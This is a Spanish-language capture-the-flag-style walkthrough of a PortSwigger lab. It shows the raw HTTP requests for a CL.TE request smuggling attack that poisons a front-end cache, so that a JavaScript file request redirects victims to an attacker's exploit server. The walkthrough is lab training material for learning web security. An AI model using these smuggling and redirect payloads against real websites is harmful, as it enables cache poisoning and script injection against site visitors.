## Exploiting HTTP request smuggling to perform web cache poisoning
### Lab Description
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert `document.cookie`.


Primero procedemos a testear si es posibile utilizar nuestras dos cabeceras preferidas:
~~~
POST / HTTP/1.1
Host: Portsqiger-lab
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
~~~
El time out significa que es CL.TE, el front-end está priorizando el content-length y el backend da un time out porque nunca recibe un 0 que indique que la solicitud terminó.
La primera request dió 200, la segunda me dió 404, con esto confirmamos que es vulnerable al pipeling
~~~
POST / HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Transfer-Encoding: chunked

0

GET /qwert HTTP/1.1
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
~~~
Ahora como nuestro objetivo es un cache poisoning en toda la página, necesitamos ver si existe un endpoint que cargue una página, es decir que tenga un offsite redirect
~~~
GET /post/next?postId=9 HTTP/1.1
~~~
Y lo hay, así que tan solo tenemos que utilizar la request concatenada a este endpoint que carga el siguiente posteo
Utilizando el host de un sitio malicioso
```
GET /post/next?postId=9 HTTP/1.1
Host: exploit-0ad1002c03f2454882a51a8f017f0067.exploit-server.net/exploit
Content-Length: 3

x=
```
En la pestaña "Resend" obtenemos la respuesta:
```
HTTP/1.1 302 Found
Location: https://exploit-0ad1002c03f2454882a51a8f017f0067.exploit-server.net/exploit/post?postId=10
Set-Cookie: session=dbXLlTEUaPzw2oa6tLp5ZHekkDLNNzBv; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```
Es decir que la request de la víctima se está redirigiendo a la página maliciosa correctamente (lo podemos ver en la cabecera d location). A esto se le llama redireción abierta y puede representar una vulnerabilidad hasta critica
Por lo que tenes una offside redirection exitosa, sin embargo no se esta almacenando, Buscando entre las distintas rutas registradas en HTTP history de nuestro Burpquite, encontramos un GET /resources/js/tracking.js HTTP/1.1 que se carga junto con la ruta del POST, esta ruta tiene una función en texto claro de "document.write" lo que la hace perfecta:
Enviamos la request que carga la imagen hasta que alcance una "age" alta, así durará más en la pantalla:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0add000703bc4513821c1bd3009000e6.web-security-academy.net
Cookie: session=zZGB8KezpjC5hQQjsKeNceOdQuE98eNk
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0add000703bc4513821c1bd3009000e6.web-security-academy.net/post?postId=10
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1
```

~~~
POST / HTTP/1.1
Host: 0add000703bc4513821c1bd3009000e6.web-security-academy.net
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0add000703bc4513821c1bd3009000e6.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Cookie: session=zZGB8KezpjC5hQQjsKeNceOdQuE98eNk
Sec-Websocket-Key: PI/UOmFb9vGiHi2pUnwLkQ==
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=9 HTTP/1.1
Host: exploit-0ad1002c03f2454882a51a8f017f0067.exploit-server.net
Content-Length: 3

x=
~~~